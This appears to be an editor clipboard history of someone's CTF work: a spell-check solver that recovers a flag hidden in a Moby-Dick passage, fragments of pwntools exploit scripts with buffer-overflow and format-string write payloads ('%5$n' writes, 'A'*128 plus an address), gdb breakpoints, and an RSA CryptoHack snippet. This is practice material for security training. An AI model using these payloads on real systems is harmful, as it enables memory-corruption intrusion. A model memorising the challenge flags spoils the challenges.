	1	-3.943	I bquic?l? follo?ed suit, and descending into the bar-room accosted the grinning alandlord ver? pleasantl?. I cherished no malice to?ards him, though he had been s??lar?ing ?ith me not a little in the matter of m? bedfello?. Ho?ever, a good laugh is a might? good thing, and rather too scarce a good thing; tthe more‚Äôs the pit?. So, if an? one man, in his o?n proper person, afford stuff for a good ?o?e to an?bod?, let him not be bac??ard, but let him cheerfull? allo? himself to spend and be spent in that ?a?. And the man that has an?thing bountifull? laughable about him, be sure there is more in that man than ?ou perhaps thin? for. The bar-room ?as no? full of the pboarders ?ho had been dropping in the night previous, and ?hom I had not as ?et had a good loo? at. The? ?ere nearl? all ?halemen; chief mates, and second mates, and third mates, and sea carpenters, and sea coopers, and sea blac?smiths, and harpooneers, and ship ?eepers; a bro?n and bra?n? compan?, ?ith bos?? beards; an unshorn, shagg? set, all ?earing mon?e? ?ac?ets for morning go?ns. ?ou could prett? plainl? tell ho? long each one had been ashore. This ??oung fello?‚Äôs health? chee? is li?e a sun-toasted pear in hue, and ?ould seem to smell almost as mus??; he cannot have been three da?s landed from his Indian vo?age. That man ne?t him loo?s a fe? shades lighter; ?ou might sa? a touch of satin ?ood is in him. In the comple?ion of a third still lingers a tropic ta?n, but slightl? bleached ?ithal; he doubtless has tarried ?hole ?ee?s ashore. But ?ho could sho? a chee? li?e Queequeg? ?hich, barred ?ith various ntints, seemed li?e the Andes‚Äô ?estern slope, to sho? forth in one arra?, contrasting climates, ?one b? ?one. ‚ÄúGrub, ho!‚Äù no? cried the {landlord, flinging open a door, and in ?e ?ent to brea?fast. The? sa? that men ?ho have seen the ?orld, thereb? become quite at ease in manner, quite self-possessed in compan?. Not al?a?s, though: Led?ard, the great Ne? England travelhler, and Mungo Par?, the Scotch one; of all men, the? possessed the least assurance in the parlor. But perhaps the mere crossing of Siberia in a sledge dra?n b? dogs as Led?ard did, or the ta?ing a long solitar? ?al? on an empt? stomach, in the negro heart of Africa, ?hich ?as the sum of poor Mungo‚Äôs performances‚Äîthiis ?ind of travel, I sa?, ma? not be the ver? best mode of attaining a high social polish. Still, for the most part, that sort of thing is to be had an??here. These reflections ?ust here are occasioned b? the circumstadnce that aftder ?e ?ere all seated at the table, and3 I ?as preparing to hear some good stories about ?haling; to m? no small surprise, nearl? ever? man maintained a profound silence. And not onl? that, but the? loo?ed embarrassed. ?es, here ?ere a set of nsea-dogs, man? of ?hom ?ithout the _slightest bashfulness had mboarded great ?hales on the high seas‚Äîentire strangers to them‚Äîand duelled them dead ?ithout ?in?ing; and ?et, here the? sat at a social obrea?fast table‚Äîall of the same calling, all of ?indred tastes‚Äîloo?ing round as sheepishl? at each other as though the? had never been out of sight of some sheepfold among the Green Mountains. A curious sight; these bashful bears, these btimid ?arrior ?halemen! But as for Queequeg‚Äî?h?, Queequeg sat there among them‚Äîa?t the head of the table, too, it so chanced; as cool as an icicle. To be sure I cannot sa? much for his breeding. His greatest admirer could not have cordiall? ?ustified his bringing his harpoon into brea?fast ?ith him, and using it there ?ithout ceremon?; reaching over the table ?ith it, _to the imminent ?eopard? of man? heads, and grappling the beefstea?s to?ards him. But that ?as certainl? ver? cooll? done b? him, and ever? one ?no?s that in most people‚Äôs destimation, to do an?thing cooll? is to do it igenteell?. ?e ?ill cnot spea? of all Queequeg‚Äôs peculiarities here; ho? he esche?ed coffee and hot rolls, and applied his undivided attention to beefstea?s, done rare. Enough, that ?hen ?brea?fast ?as over he ?ithdre? li?e the rest into the public room, lighted his tomaha??-pipe, and ?as sitting there quietl? digesting and smo?ing ?ith his inseparable hat on, ?hen I sallied out for a} stroll.
f83f2e1c71bf80b238c3e5c2bfd9c258|file:///home/neo/CTFs/batpwn2020/mick/solve.py|9|1|V|python
	print(misspelled)
3e9f451d1da6a2335f835b75c3f5a498|file:///home/neo/CTFs/batpwn2020/mick/solve.py|7|1|V|python
	print(data)
58f47ba0b627103483fb2165f262d030|file:///home/neo/CTFs/batpwn2020/mick/solve.py|11|12|v|python
	word.translate(None, string.punctuation)
56f6c86d829ee3dfc705d19e36d17e7a|file:///home/neo/CTFs/batpwn2020/mick/solve.py|11|5|V|python
	    word = 
0904f85b3d756f3dfdedb46e9b023483|file:///home/neo/CTFs/batpwn2020/mick/solve.py|7|27|v|python
	.translate(str.maketrans('', '', string.punctuation))
a4b34d91846e341c81450575e0cd14dd|file:///home/neo/CTFs/batpwn2020/mick/solve.py|10|13|v|python
	misspelled
6da2176c497da69d44fc7603c596489e|file:///home/neo/CTFs/batpwn2020/mick/solve.py|10|23|V|python
	for word in misspelled:
	    print(word)
cd744f23e0ae1acbc1615f0f388f80e6|file:///home/neo/CTFs/batpwn2020/mick/solve.py|8|1|V|python
	misspelled = spell.unknown(data)
65c8077da0bb09d704242b8d41971b02|file:///home/neo/CTFs/batpwn2020/mick/solve.py|10|5|V|python
	    print(word)
b26b98e6ae0888855bfe965e382e5655|file:///home/neo/CTFs/batpwn2020/mick/solve.py|11|5|V|python
	    print(wrong)
66c75c986ed69fef7c41a6dcd1747200|file:///home/neo/CTFs/batpwn2020/mick/solve.py|10|5|V|python
	    word = list(word)
a3da323daa61ad759d95d0ca9b276c19|file:///home/neo/CTFs/batpwn2020/mick/solve.py|10|1|V|python
	for word in data:
10faafff773f521ec1da09fc47c8a7ec|file:///home/neo/CTFs/batpwn2020/mick/solve.py|11|5|V|python
	    if len(wrong) != 0:
	        print(wrong)
0560d013a47cf95d4b3fb0e830c95536|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	bquickly 
9024c66d36528cbfdd0c1c16d1d8ea5e|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	followed 
9cf5af279482cc1b8cffc17b00ee1186|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	suit
2da69c2cfd7660e8ec9ee26237262ef6|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	descending 
b93113a3d509e97130e45bd4170e976b|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	into 
ca58be33908b31256b871dead040ecec|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	room 
8d9371e961e0d085b3c4cc0b8d305d01|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	accosted 
b530511f43f79aeb2757b200d522fee4|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	grinning 
7c4b9607fcc8a25cf4532f1bf4ee2645|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	alandlord 
3d0382b8ca18d674ecc064bd354b3346|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	very 
aa9fc3b2bc46daa1c0dd09c4a82a3509|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	pleasantly
c309f3cdd103fa475f9708a1339d9148|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	cherished 
6618a5defb15721a32c8f1b81f0bb5de|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	malice 
feb5366d3b7f07bcb04e360d102d3cb0|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	towards 
f4b0f41ac8a58bf96e95faaea94b7e56|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	though 
4483b268b80a911d719e52c233776326|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	had 
d06109d13bd46e880ae1cf77e34b3425|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	been 
806d26c49420483edeefd7e240d50a13|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	skylarking 
fbcdf0a327a2ea84d2819abb16a78018|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	with 
ef78f9b8f213555773f8831110269c8f|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	little 
2e030d896529a7b4c551012efbc006cb|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|v|text
	matter 
4be08941562eee24dabe94bf7b7b46c3|file:///home/neo/CTFs/batpwn2020/mick/solve.py|7|15|v|python
	.translate(str.maketrans('','',string.punctuation)).split(' ')
742d2747b5716985430ed733bf6a887d|file:///home/neo/CTFs/batpwn2020/mick/solve.py|11|1|V|python
	wrong = spell.unknown(data)
e6c2a9dc235fa41a49ca28fd8467a129|file:///home/neo/CTFs/batpwn2020/mick/solve.py|11|1|V|python
	print(wrong)
f79a9c724ffcb1c75d6e301cb9aa806d|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|1|1|V|text
	neo@neo:~/CTFs/batpwn2020/mick$ python3 solve.py 
857b38a98334f12a7c108afa520fe01f|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|1|2|v|text
	quickly 
4d06360404de4e31f136777f39d4d4be|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|2|2|v|text
	landlord 
b9826651e2d9a61151b1dea2c1c4a327|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|4|2|v|text
	ore‚Äôs 
9076f318fb980c0eed928ee54409d392|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|4|1|V|text
	more‚Äôs 
e86dba2c0b6ec71df3878d464f21a753|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|4|2|v|text
	boarders 
12452895bc75ebc3de5318018780c63b|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|5|2|v|text
	young 
e7214493c4255d96cab69e5c79f4840b|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|6|1|V|text
	fellow‚Äôs 
adc331eb048b0e7eef6884300a4e674b|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|6|2|v|text
	tints, 
68a5f4c7a4ff1107ca2f80b573c95d07|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|7|1|V|text
	Andes‚Äô 
dfddb3dd91ec0c7638491bee9d314111|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|7|1|V|text
	‚ÄúGrub, 
979a2206807a957c03bb1d6c7557b97f|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|7|1|V|text
	ho!‚Äù 
83a54cc35b5943ed181e415fe322073e|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|7|2|v|text
	landlord, 
e785d2aca91267697e9f571333e92691|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|9|1|V|text
	Mungo‚Äôs 
64bdb23dbe2874a97777ca00c46e3758|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|9|1|v|text
	performances‚Äîthiis 
95cb1a6719a714d638db6d19bbcc17a9|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|10|1|v|text
	circumstadnce 
ff3ea41fb98696be5cf3f89b70d3e9b7|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|11|1|v|text
	aftder 
589ae6e9a11dde7f1d52fdcef894e7a3|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|13|2|v|text
	sea-dogs, 
a9634fabc0570de873c512979a92bd42|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|14|2|v|text
	slightest 
7c60f104a0cd892cde380a95332a4ba3|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|15|2|v|text
	boarded 
302ec4a66d6db13e021b23ad07ebdfcd|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|16|2|v|text
	breakfast 
1fc9f0c4aa17b36bf42daba4cf25b408|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|17|2|v|text
	timid 
727cffc1cbec8bb08c142c0e28373042|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|18|1|v|text
	them‚Äîayt 
67b336c15c8ae193481bcfd3f4af8c47|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|20|1|V|text
	people‚Äôs 
156a71ebb97b15f0b87fcb865b5bca19|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|20|1|v|text
	destimation, 
d612ce4320e8b6cbab7c8acec23f34ef|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|21|2|v|text
	genteelly. 
e88d29ac75f46966d18e337a8f2f7a95|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|23|1|V|text
	bquickly 
	alandlord 
	tthe 
	more‚Äôs 
	pboarders 
	wyoung 
	fellow‚Äôs 
	ntints, 
	Andes‚Äô 
	‚ÄúGrub, 
	ho!‚Äù 
	{landlord, 
	travelhler, 
	Mungo‚Äôs 
	performances‚Äîthiis 
	circumstadnce 
	aftder 
	and3 
	nsea-dogs, 
	_slightest 
	mboarded 
	obreakfast 
	btimid 
	them‚Äîayt 
	_to 
	people‚Äôs 
	destimation, 
	igenteelly. 
	cnot 
	Queequeg‚Äôs 
	kbreakfast 
	a} 
	
	We 
00187f224e8e8358fe71ead17fcf6ad7|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|57|1|V|text
	We 
	will 
	cnot 
	speak 
	of 
	all 
	Queequeg‚Äôs 
	peculiarities 
	here; 
	how 
	he 
	eschewed 
	coffee 
	and 
	hot 
	rolls, 
	and 
	applied 
	his 
	undivided 
	attention 
	to 
	beefsteaks, 
	done 
	rare. 
	Enough, 
	that 
	when 
	kbreakfast 
	was 
	over 
	he 
	withdrew 
	like 
	the 
	rest 
	into 
	the 
	public 
	room, 
	lighted 
	his 
	tomahawk-pipe, 
	and 
	was 
	sitting 
	there 
	quietly 
	digesting 
	and 
	smoking 
	with 
	his 
	inseparable 
	hat 
	on, 
	when 
	I 
	sallied 
	out 
	for 
	a} 
	stroll. 
eb77056c101d4425f0a18bf4e5b2e356|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|22|1|V|text
	
	neo@neo:~/CTFs/batpwn2020/mick$ python3 solve.py 
	bquickly 
	alandlord 
	tthe 
	more‚Äôs 
	pboarders 
	wyoung 
	fellow‚Äôs 
	ntints, 
	Andes‚Äô 
	‚ÄúGrub, 
	ho!‚Äù 
	{landlord, 
	travelhler, 
	Mungo‚Äôs 
	performances‚Äîthiis 
	circumstadnce 
	aftder 
	and3 
	nsea-dogs, 
	_slightest 
	mboarded 
	obreakfast 
	btimid 
	them‚Äîayt 
	_to 
	people‚Äôs 
	destimation, 
	igenteelly. 
c6e76a980574b2bd53e194d738cb10bf|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|23|1|V|text
	Queequeg‚Äôs 
d020bf07865056d616a64dc9549ef558|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|1|1|V|text
	
	neo@neo:~/CTFs/batpwn2020/mick$ python3 solve.py 
9cc900712e9b4d46f173410fd63eca8b|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|33|1|V|text
	b
	a
	t
	p
	w
	n
	{
	h
	i
	d
	d
	3 
	n
	_
	m
	o
	b
	y
	_
	m
	i
	c
	k
	} 
	
423c73f1267727644510135cd852a21c|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|8|1|v|text
	travelhler, 
fbeabae3cc2509c33b64c3f5373a0b2e|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|12|1|v|text
	and3 
01eee14ccd493e861fea67e05e2040c5|file:///home/neo/CTFs/batpwn2020/mick/sol.txt|21|2|v|text
	estimation, 
8ec22b8e6b31313c4d14aef31e75a308|file:///home/neo/pwnablexyz/misalignment/exploit.py|49|1|V|python
	WIN_ADDR = exe.sym.win
	RAX = 13 # Size of array: 11, +2 to overwrite ret address
	log.info("Win address: %#x" % WIN_ADDR)
	io.sendlineafter('Input:', str(WIN_ADDR) + " 0 " + str(RAX))
	io.sendlineafter('Input:', "aaa")
64a642b29ca8eb9a5febda93712cfad2|file:///home/neo/pwnablexyz/misalignment/exploit.py|43|10|V|python
	    b main
	    b *0x400851
	    b *0x4008c6
eddf27eb6a2a297dce15278c0d120087|file:///home/neo/pwnablexyz/misalignment/exploit.py|49|1|V|python
	io.sendline(str(val1) + " 0 -5")
8e34b60a85b8ef4df1e9132ef0d45aaa|file:///home/neo/pwnablexyz/misalignment/exploit.py|50|1|V|python
	line = io.recvline()
	log.info("rec %s" % line)
cbefdbf0ab22cea879a05d26316921dc|file:///home/neo/pwnablexyz/misalignment/exploit.py|51|1|V|python
	log.info("rec %s" % line)
f4c3d0d5c072ee9bda6d38a2a964f829|file:///home/neo/pwnablexyz/misalignment/exploit.py|50|1|v|python
	line 
ef9282c1dab361870edbc23072c947ea|file:///home/neo/pwnablexyz/misalignment/exploit.py|44|5|V|python
	    b *0x555555554a95
af21aeb8b6181bf5b1ec2608bd3164bd|file:///home/neo/pwnablexyz/misalignment/exploit.py|43|17|v|python
	+0x0000000000000a95
01bab7b71ea00aff06a9939517382a2c|file:///home/neo/pwnablexyz/misalignment/exploit.py|49|1|V|python
	print(val1)
8a2306d8ad0441992b99cc9127c5399a|file:///home/neo/pwnablexyz/misalignment/exploit.py|57|9|V|python
	184549376
	181
11b1cc1f74f0e5ae25d4cdacffd87de3|file:///home/neo/pwnablexyz/misalignment/exploit.py|59|1|V|python
	48586817536
dba279a5cecdbbcddc1c104125ad1c31|file:///home/neo/pwnablexyz/misalignment/exploit.py|59|1|V|python
	13042424520864956416
57de34143b686bcd1efdf3006c48eaa1|file:///home/neo/pwnablexyz/misalignment/exploit.py|57|3|V|python
	184549376
	815151532554059776
a65c4fee39c3d3c2fd7ecb8e6e489318|file:///home/neo/pwnablexyz/misalignment/exploit.py|58|1|V|python
	184549376
15c55b92d5a9a2f472af59e4e2816c77|file:///home/neo/pwnablexyz/misalignment/exploit.py|59|1|V|python
	50946970784628736
c47532bbb1e2883c902071591ae1ec9b|file:///home/neo/pwnablexyz/misalignment/exploit.py|48|12|v|python
	00000000000000
b55c1bf7cce7995b9d967a433b6d9152|file:///home/neo/pwnablexyz/misalignment/exploit.py|58|9|V|python
	184549376
	50946970784628736
dd6ec9dd657f866a37705ecc73faee53|file:///home/neo/pwnablexyz/misalignment/exploit.py|49|1|V|python
	print(val1)
	print(val2)
97012b830b864c00beac6ba053b9a61c|file:///home/neo/CTFs/batpwn2020/cryptographer/noob.py|23|1|V|python
	xorer(flag,noobda)
378a8ac013364c3dcd8fc3dd2c21bf7f|file:///home/neo/CTFs/batpwn2020/cryptographer/noob.py|15|1|V|python
	timestamp = 1589457600
6d85aa59585ce2af3abbb6b6f0fae622|file:///home/neo/CTFs/batpwn2020/cryptographer/noob.py|17|1|V|python
	print int(timestamp)
b9700b7f9d7de10ca1551585e1ceb691|file:///home/neo/CTFs/batpwn2020/cryptographer/noob.py|25|12|V|python
	print noobda
	print(xor(flag,noobda))
d7e6d55ba379a13d08c25d15faf2a23b|file:///home/neo/CTFs/batpwn2020/cryptographer/noob.py|19|23|v|python
	timestamp
42847eb84004f10143f1612752027a14|file:///home/neo/CTFs/batpwn2020/prefixes/run.go|37|1|V|go
	        fmt.Printf("Init: %d\n", initialize)
95b19f7739b0b7ea7d6b07586be54f36|file:///home/neo/CTFs/batpwn2020/prefixes/run.go|36|21|v|go
	Init
30db597822c6e06c6737052260426f45|file:///home/neo/CTFs/batpwn2020/prefixes/run.go|36|33|v|go
	initialize
f14279b854ae269943975c0110d0563e|file:///home/neo/CTFs/batpwn2020/prefixes/run.go|45|12|v|go
	strings.Replace(hexify(ot), "00", "", -1)
0f6bad540ce11d552e952244e62593bc|file:///home/neo/pwnablexyz/grownup/exploit.py|44|1|V|python
	    b *0x400851
	    b *0x4008c6
b04ec0ade3d49b4a079f0e207d5e2821|file:///home/neo/pwnablexyz/grownup/exploit.py|6|31|v|python
	challenge
977d1db74398fe474805eb0a7c732091|file:///home/neo/pwnablexyz/grownup/exploit.py|51|1|V|python
	io.sendlineafter(': ', b"A" * 128 + p64(FLAG_ADDR))
16a51c029575fc05a566ab3fd3adaa03|file:///home/neo/pwnablexyz/grownup/exploit.py|52|8|v|python
	lineafter(': ', b"A" * 128 
80fd61a944d5b4be0933b38ef49c153e|file:///home/neo/pwnablexyz/grownup/exploit.py|52|35|v|python
	+ p64(FLAG_ADDR))
34f6a7d433df3bc85e4fa0fce6db4e49|file:///tmp/st-edit.EWRnC8|1|1|V|
	neo@neo:~$ ulimit -c 
	0 
	neo@neo:~$ ulimit -c unlimited 
	neo@neo:~$ ulimit -c 
	0 
	neo@neo:~$ 
ec0fbf50b985d61b9bf692593661db86|file:///etc/security/limits.conf|46|1|V|limits
	neo               hard    core            unlimited
	neo               soft    core            unlimited
34fd0341d746f17d95fcde214a478348|file:///tmp/st-edit.nCqlEk|1|1|V|
	u%                                                                                                                                     neo@neo:~$ ulimit -c 
d1b0a78b288415fd408d79879ec1a851|file:///tmp/st-edit.nCqlEk|1|1|v|
	u%                                                                                                                                     
2907d4838ea3749f56e7b9a34ab8b68b|file:///tmp/st-edit.nCqlEk|1|1|V|
	neo@neo:~$ ulimit -c 
	0 
	neo@neo:~$ ulimit -c unlimited 
	neo@neo:~$ ulimit -c 
	0 
	neo@neo:~$ su neo 
	Password: 
	neo@neo:~$ ulimit -c unlimited 
	neo@neo:~$ ulimit -c 
	unlimited 
	neo@neo:~$ 
cef4382a2c96477021218fd276089c47|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|48|15|v|python
	%x%x%x%x%x
f7678742fab72dcc6e02a37a9894bc51|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|44|5|V|python
	    b *0x08049f7f
8bafb2cb97f4d061f7106733f5b7bdc6|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|44|5|V|python
	    # b *0x8049f44
266588078a4099449b97b9b0fcc2ad89|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|52|1|V|python
	# io.sendline(b'\x1e\xcf\xff\xff%99x%5$n')
126f6299528104f6c5228eca99c8dd3b|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|53|15|v|python
	\x1e\xcf\xff\xff%99x%5$n
7e584e1a9c06df41a7d775ed5b44ab06|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|51|1|V|python
	# 0xffc1b1dc:0xffffd1e0:
ac72ab48913a9d5f1e4794d05df7ceb6|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|50|1|V|python
	# io.sendline(b'%5$x')
f242116b8a8a0dd40fc6f52152acdde7|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|51|1|V|python
	0xffff9f90:
69f879df4dd7af3964d19f5c5698bdf2|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|51|15|v|python
	\x9c\x9f\xff\xff%5$n
6ca1feaa286407aeba78698aba9dad86|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|44|5|V|python
	    b *0x8049f44
0e34ea6e3dd292aaa723991610663504|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|50|1|V|python
	io.sendline(b'\x1e\xcf\xff\xff%99x%5$n\x9c\x9f\xff\xff%5$n')
13f3320f9c1828f1420a990b930aa778|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|51|15|^v|python
	\x1e\xcf\xff\xff%99x%5$n\
6625692b010ccafaa41686985280bbcd|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|51|1|V|python
	io.sendline(b'\x9c\x9f\xff\xff$99x%5$n')
0e3f0cbb2cb3a87e1e68d503263c3a0c|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|50|1|V|python
	io.sendline(b'\x1e\xcf\xff\xff%99x%5$n\x9c\x9f\xff\xff%10000x%5$n')
448c5ab783d4ae42b65aaa3b28e6e0cb|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|51|39|v|python
	\x9c\x9f\xff\xff%10000x%5$n
3022734e52ca7fd0b66d9d631de0f18e|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|54|1|V|python
	io.sendline(b'')
70cc19fa823ffdcc1e09cb1226fa0f38|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|54|57|^v|python
	%8x$x 
646a582d6f2674af8cf6f02577129d6a|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|54|57|v|python
	 * %9$x * %10$x * %11$x * %12$x
c172e2d1539388330f6fc68d28ad3882|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|51|1|V|python
	io.sendline(b'\x1e\xcf\xff\xff%99x%5$n')
6fb8dfa06580785669acc3d8b5bf1a02|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|52|1|V|python
	io.sendline(b'\x04\xcb\xff\xff%99x%5$n')
392dccf218d1abf2f53b8a6b865a73b9|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|54|1|V|python
	# io.sendline('AAAABBBBCCCCDDDD << %5$x * %6$x * %7$x * %8$x >>')
	io.interactive()
0805bfb4f92d83f0ec5bc9c0090f2993|file:///home/neo/CTFs/batpwn2020/echoserver/exploit.py|54|1|V|python
	# io.sendline('AAAABBBBCCCCDDDD << %5$x * %6$x * %7$x * %8$x >>')
d41f5e83eb928ba712c329fa975c6dc9|file:///home/neo/CTFs/scripts/pwn/fmt_str.py|1|1|V|python
	#!/usr/bin/python2
cc9deb1f26e09549c99c066e246e180b|file:///home/neo/pwnablexyz/grownup/exploit.py|3|13|v|python
	chall
d3dc7714fabad1032134f4b147e1dfba|file:///home/neo/pwnablexyz/grownup/exploit.py|30|18|v|python
	Choose spell to cast: 
c3921ce00af506f693a45bbcad6d7b12|file:///home/neo/pwnablexyz/grownup/exploit.py|30|5|V|python
	    r.recvuntil('')
4e9d38a5d9f5f23fe1084d87bad85152|file:///home/neo/pwnablexyz/grownup/exploit.py|21|1|V|python
	GET_FLAG = 0x80485b6
4b361aedcbd0700f8b37760a967bb731|file:///home/neo/pwnablexyz/grownup/exploit.py|22|1|V|python
	# CIRCLE_OF_ELEMENTS = 0x8049c48
	# PUTS_GOT = 0x8049c28
a837a6310eb653a3a6ac165b9804ecd3|file:///home/neo/pwnablexyz/grownup/exploit.py|47|4|v|python
	sendlineafter
b65528caaa0a1429dd97682f263c4ce0|file:///home/neo/pwnablexyz/grownup/exploit.py|47|19|v|python
	_contains(':'
5405f230242d7eef1bf151acdd036bcd|file:///home/neo/pwnablexyz/grownup/exploit.py|47|19|v|python
	_contains
38f55fdd9d0fd3efc1e6dcfdec0c91a7|file:///home/neo/pwnablexyz/grownup/solve.py|21|1|V|python
	FLAG_ADDR = 0x601080
78634cdbd714dd171bb61f4b490af694|file:///home/neo/pwnablexyz/grownup/exploit.py|52|13|v|python
	'yyyyyyyyaaaaaa'
eb51fcbdfb1f4629ffb0114afe13f29a|file:///home/neo/pwnablexyz/grownup/exploit.py|59|1|V|python
	# payload += (128 - 16 - 6)//4 * '%x  '
468bc9ad6323de2c872a3da73dab48b1|file:///home/neo/pwnablexyz/grownup/exploit.py|52|26|v|python
	[:-1]
76d8cc9f51b2ab4141df7a71f0f1458d|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|34|1|V|python
	print(enc_data)
c79d0cdeddaae9037f0f562a09c88c0a|file:///home/neo/cryptohack/general/brainteasers/output_unencryptable.txt|5|1|V|text
	c = 0x5233da71cc1dc1c5f21039f51eb51c80657e1af217d563aa25a8104a4e84a42379040ecdfdd5afa191156ccb40b6f188f4ad96c58922428c4c0bc17fd5384456853e139afde40c3f95988879629297f48d0efa6b335716a4c24bfee36f714d34a4e810a9689e93a0af8502528844ae578100b0188a2790518c695c095c9d677b
e38efa5d6946f806a307307f7c75f247|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|40|19|v|python
	long_to_bytes(pt)
e44f9e348e41cb272efa87387728571b|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|34|7|v|python
	DATA
5c0423f27bf3b7e91eae3017f06b43f1|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|34|1|V|python
	print(bytes_to_long(DATA))
b811ef1fb639da603c06b9c7a4b6ab30|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|34|1|V|python
	FLAG = 
0bb3ca1c9896f6fd3cbadcf6ffba51eb|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|34|1|V|python
	ct = long_to_bytes(c)
5fc3befadd36f37962aeb1a7650b5d31|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|37|1|V|python
	print(bytes_to_long(DATA) < N)
bcae4ee16206cf60f3089d1083a0a05b|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|28|1|V|python
	N = 89820998365358013473897522178239129504456795742012047145284663770709932773990122507570315308220128739656230032209252739482850153821841585443253284474483254217510876146854423759901130591536438014306597399390867386257374956301247066160070998068007088716177575177441106230294270738703222381930945708365089958721
defefdbb5e09aef0a967ea3162089e0b|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|28|1|V|python
	N = 89820998365358013473897522178239129504456795742012047145284663770709932773990122507570315308220128739656230032209252739482850153821841585443253284474483254217510876146854423759901130591536438014306597399390867386257374956301247066160070998068007088716177575177441106230294270738703222381930945708365089958721
	
ec239a679bf859c38ae242c31b789e9e|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|46|9|V|python
	        print(last)
e1310eda32a6299fb77c01ef65d941dc|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|46|12|V|python
	        if i - last != 512:
	            print(i)
266f0c3e2837e79721c3b9c6b29fa829|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|45|16|V|python
	        print(i)
	        print(enc)
b8f152abe0884d02e0afd7da00576006|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|41|1|V|python
	last = i
5189458207425c70bdba0f0afb9fa120|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|45|1|V|python
	        # last = i
9e4f15ea00f2614593ad08197e527580|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|43|5|V|python
	    if enc is None:
